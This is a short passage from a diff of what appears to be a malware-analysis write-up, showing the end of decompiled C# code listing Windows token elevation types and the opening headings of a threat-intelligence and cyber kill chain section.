+			TokenElevationTypeFull,
+			// Token: 0x0400004B RID: 75
+			TokenElevationTypeLimited
+		}
+	}
+}
+```
+
 <h2>Threat Intelligence</h2><a name="Intel"></a></h2>
 <h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
 <h6>The process graph resume cyber kill chains used by the attacker :</h6>
